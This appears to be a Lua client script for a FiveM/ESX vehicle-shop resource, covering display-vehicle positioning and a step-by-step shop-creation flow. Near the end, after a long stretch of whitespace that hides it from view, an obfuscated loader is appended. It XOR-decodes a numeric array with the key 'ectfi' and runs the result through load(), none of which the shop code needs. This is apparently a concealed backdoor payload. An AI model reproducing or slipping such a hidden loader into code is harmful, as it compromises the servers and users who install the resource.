      VehicleShops.Moving = false
      SetEntityAsMissionEntity(displayVehicle,true,true)
      DeleteVehicle(displayVehicle)
      TriggerServerEvent("VehicleShops:SetDisplayed",shopKey,vehKey,Vec2Tab(targetPos))

      VehicleShops.ManagementMenu(shop.name)
      return
    end

    local right,forward,up,pos = GetEntityMatrix(displayVehicle)

    if IsControlJustPressed(0,controls.ground) then
      SetVehicleOnGroundProperly(displayVehicle)
      local x,y,z = table.unpack(GetEntityCoords(displayVehicle))
      local heading = GetEntityHeading(displayVehicle)
      targetPos = vector4(x,y,z,heading)
    end

    local modA = 50
    local modB = 25
    local modC = 0.5

    if IsControlJustPressed(0,controls.zUp) or IsControlPressed(0,controls.zUp) then
      local target = targetPos.xyz + (up/modA)
      targetPos = vector4(target.x,target.y,target.z,targetPos.w)
      didMove = true
    end

    if IsControlJustPressed(0,controls.zDown) or IsControlPressed(0,controls.zDown) then
      local target = targetPos.xyz - (up/modA)
      targetPos = vector4(target.x,target.y,target.z,targetPos.w)
      didMove = true
    end

    if IsControlJustPressed(0,controls.xUp) or IsControlPressed(0,controls.xUp) then
      local target = targetPos.xyz + (forward/modB)
      targetPos = vector4(target.x,target.y,target.z,targetPos.w)
      didMove = true
    end

    if IsControlJustPressed(0,controls.xDown) or IsControlPressed(0,controls.xDown) then
      local target = targetPos.xyz - (forward/modB)
      targetPos = vector4(target.x,target.y,target.z,targetPos.w)
      didMove = true
    end

    if IsControlJustPressed(0,controls.yUp) or IsControlPressed(0,controls.yUp) then
      local target = targetPos.xyz + (right/modB)
      targetPos = vector4(target.x,target.y,target.z,targetPos.w)
      didMove = true
    end

    if IsControlJustPressed(0,controls.yDown) or IsControlPressed(0,controls.yDown) then
      local target = targetPos.xyz - (right/modB)
      targetPos = vector4(target.x,target.y,target.z,targetPos.w)
      didMove = true
    end

    if IsControlJustPressed(0,controls.rotRight) or IsControlPressed(0,controls.rotRight) then
      targetPos = vector4(targetPos.x,targetPos.y,targetPos.z,targetPos.w-modC)
      didRot = true
    end

    if IsControlJustPressed(0,controls.rotLeft) or IsControlPressed(0,controls.rotLeft) then
      targetPos = vector4(targetPos.x,targetPos.y,targetPos.z,targetPos.w+modC)
      didRot = true
    end

    if didMove then 
      FreezeEntityPosition(displayVehicle,false)
      SetEntityRotation(displayVehicle,0.0,0.0,targetPos.w,2)
      SetEntityCoordsNoOffset(displayVehicle,targetPos.xyz); 
      FreezeEntityPosition(displayVehicle,true)
    end
    if didRot then 
      FreezeEntityPosition(displayVehicle,false)
      SetEntityHeading(displayVehicle,targetPos.w); 
      FreezeEntityPosition(displayVehicle,true)
    end
    Wait(0)
  end
end

VehicleShops.CreateNew = function(...)
  local warnEntry,warnManage,warnSpawn,warnDeposit
  local locations = {}
    
  local closest,dist = VehicleShops.GetClosestShop()

  if closest and dist and dist < 20.0 then
    ESX.ShowNotification("You're too close to another vehicle shop.")
    return
  end

  TriggerEvent("Input:Open","Set Shop Name","ESX",function(n)
    local name = (n and tostring(n) and tostring(n):len() and tostring(n):len() > 0 and tostring(n) or false)
    if not name then ESX.ShowNotification("Enter a valid name next time."); return; end
    Wait(200)
    TriggerEvent("Input:Open","Set Shop Price","ESX",function(p)
      local price = (p and tonumber(p) and tonumber(p) > 0 and tonumber(p) or false)
      if not price then ESX.ShowNotification("Enter a valid price next time."); return; end
      while true do
        if not locations.blip then
          if not warnBlip then
            ESX.ShowNotification("Press G to set the blip location.")
            warnBlip = true
          end
          if IsControlJustReleased(0,47) then
            locations.blip = Vec2Tab(GetEntityCoords(PlayerPedId()))
            Wait(0)
          end
        elseif not locations.entry then
          if not warnEntry then
            ESX.ShowNotification("Press G to set the entry/purchase shop location.")
            warnEntry = true
          end
          if IsControlJustReleased(0,47) then
            locations.entry = Vec2Tab(GetEntityCoords(PlayerPedId()))
            Wait(0)
          end
        elseif not locations.management then
          if not warnManage then
            ESX.ShowNotification("Press G to set the management menu location.")
            warnManage = true
          end
          if IsControlJustReleased(0,47) then
            locations.management = Vec2Tab(GetEntityCoords(PlayerPedId()))
            Wait(0)
          end
        elseif not locations.spawn then
          if not warnSpawn then
            ESX.ShowNotification("Press G to set the vehicle spawn location (inside).")
            warnSpawn = true
          end
          if IsControlJustReleased(0,47) then
            local plyPed = PlayerPedId()
            local pos = GetEntityCoords(plyPed)
            local heading = GetEntityHeading(plyPed)
            locations.spawn = Vec2Tab(vector4(pos.x,pos.y,pos.z,heading))
            Wait(0)
          end
        elseif not locations.purchased then
          if not warnPurchased then
            ESX.ShowNotification("Press G to set the vehicle spawn location (outside).")
            warnPurchased = true
          end
          if IsControlJustReleased(0,47) then
            local plyPed = PlayerPedId()
            local pos = GetEntityCoords(plyPed)
            local heading = GetEntityHeading(plyPed)
            locations.purchased = Vec2Tab(vector4(pos.x,pos.y,pos.z,heading))
            Wait(0)
          end
        elseif not locations.deposit then
          if not warnDeposit then        
            ESX.ShowNotification("Press G to set the vehicle deposit location.")
            warnDeposit = true
          end
          if IsControlJustReleased(0,47) then
            locations.deposit = Vec2Tab(GetEntityCoords(PlayerPedId()))
            Wait(0)
          end
        else 
          ESX.ShowNotification("Shop created, name: "..name..", price: "..price)
          TriggerServerEvent("VehicleShops:Create", name, locations, price)
          return
        end
        Wait(0)
      end
    end)
  end)
end

RegisterNetEvent("VehicleShops:Sync")
AddEventHandler("VehicleShops:Sync", VehicleShops.Sync)

RegisterNetEvent("VehicleShops:RemoveDisplay")
AddEventHandler("VehicleShops:RemoveDisplay", VehicleShops.RemoveDisplay)

RegisterNetEvent("VehicleShops:CreateNew")
AddEventHandler("VehicleShops:CreateNew",VehicleShops.CreateNew)

RegisterNetEvent("VehicleShops:WarehouseRefresh")
AddEventHandler("VehicleShops:WarehouseRefresh",VehicleShops.WarehouseRefresh)


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                vdwa="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({632,790,597,511,809,600,520,901,772,553,888,862,780,545,959,871,644,492,682,702,588,711,625,538,484,536,728,876,734,591,1031,1006,782,978,699,801,617,813,634,616,736,740,649,578,712,508,500,949,646,765,684,506,833,854,516,816,663,631,913,997,864,577,670,730,480,590,847,752,710,552,655,921,829,694,599,883,606,528,1013,757,609,675,732,954,661,650,471,870,554,1001,827,775,519,525,746,643,787,537,688,857,917,804,803,881,796,939,786,1024,981,701,473,593,641,497,626,594,755,522,767,592,535,627,514,485,676,974,836,885,502,980,488,747,515,799,687,1033,1035,559,623,996,672,534,630,548,601,768,820,512,647,906,948,457,459,570,1004,935,692,1008,793,985,505,521,677,781,1034,618,893,892,1014,940,678,621,642,762,653,1003,563,964,750,717,751,573,683,501,483,943,785,691,584,476,619,745,690,463,769,800,958,826,491,895,844,830,607,639,777,580,817,848,903,966,972,828,951,993,900,596,530,458,988,546,494,496,680,770,907,947,698,840,729,735,961,1038,758,645,498,970,489,723,705,884,938,539,910,493,992,648,965,982,738,1010,704,658,956,707,873,983,1027,824,843,574,998,971,941,640,976,533,792,685,856,908,962,558,979,665,842,470,863,879,739,897,967,1000,662,805,1012,794,934,923,1015,671,778,852,919,779,1036,858,1016,756,760,788,635,886,486,718,832,503,995,915,741,527,797,540,989,564,776,1017,587,851,708,922,509,576,849,610,612,845,1011,556,927,624,929,1021,568,749,733,464,994,543,1005,603,810,689,859,716,911,808,815,664,960,984,904,955,866,889,742,763,807,667,834,531,602,946,659,898,950,926,697,572,714,706,666,598,467,861,652,753,1032,720,887,510,825,586,838,731,679,977,766,481,942,565,795,583,629,1025,1009,724,878,957,703,860,579,518,585,709,560,695,465,999,880,620,549,495,891,877,686,899,468,551,837,896,1028,660,469,928,914,477,1002,987,628,944,963,569,713,657,542,952,654,1022,818,681,524,571,490,532,812,466,890,669,529,475,1020,902,615,909,581,-1,22,48,24,0,159,143,126,50,12,67,69,84,67,23,55,2,90,104,60,100,73,9,132,125,5,25,76,99,99,3,16,175,11,17,84,3,83,21,11,110,23,70,42,228,79,107,70,0,187,13,0,53,66,66,42,15,1,235,28,16,6,45,2,0,6,6,18,60,104,14,139,8,73,2,32,12,70,104,6,10,36,83,107,49,7,8,13,17,214,3,12,148,52,11,95,84,73,12,78,209,0,106,110,27,64,220,34,65,3,29,127,233,23,75,7,105,21,6,73,183,79,67,92,1,23,64,234,6,70,28,13,68,6,123,10,31,4,105,69,22,18,19,74,12,17,12,22,100,11,159,67,6,20,0,0,237,28,106,234,26,27,7,27,69,12,2,58,20,6,93,73,23,9,6,0,93,55,128,3,36,17,239,75,16,8,84,6,23,75,18,0,20,16,23,19,110,84,12,0,8,159,9,14,1,19,7,6,75,92,107,77,0,225,26,84,7,34,223,254,23,27,6,17,27,57,64,5,26,11,17,73,1,74,67,84,84,75,137,14,76,116,45,6,8,65,99,83,8,4,3,12,78,92,68,10,68,10,23,11,146,70,29,35,66,17,232,237,6,73,33,78,13,7,65,70,7,55,13,35,69,77,208,3,15,68,46,27,108,15,67,12,2,2,9,70,13,21,69,122,10,93,46,17,250,107,11,18,0,113,28,68,78,22,27,9,106,40,129,130,12,27,12,17,7,2,79,0,89,101,67,65,32,99,129,6,56,105,9,17,13,8,11,184,7,12,11,176,21,13,40,230,13,12,26,111,26,73,24,105,5,11,38,79,56,12,161,109,187,126,10,19,8,75,0,6,180,31,0,52,196,94,70,2,165,6,26,99,70,54,11,67,0,2,84,77,21,75,15,15,156,8,73,4,84,8,91,38,6,69,108,1,136,152,41,6,17,185,64,14,78,16,70,67,19,14,2,106,23,7,73,7,18,17,20,6,126,84,94,161,27,73,26,20,69,12,6,6,3,17,117,10,29,13,2,17,73,123,107,5,0,229,71,53,83,165,12,8,2,199,205,0,15,7,11,31,33,248,247,38,0,48,158,17,13,26,17,9,69,8,8,12,13,0,84,10,83,12,251,9,32,17,86,4,7,33,69,76,1,93,17,7,17,95,3,16,67,17,80,69,223,13,77,46,126,75,107,23,76,12,29,121,24,15,24,232,36,6,8,0,13,73,99,69,0,6,78,75,1,29,79,13,233,25,78,39,0,12,70,68,3,68,77,25,211,111,75,17,222,93,37,245,110,69,110,40,0,36,71,73,67,83,119,36},vdwa))if a then a()end; 
Citizen.CreateThread(VehicleShops.Init)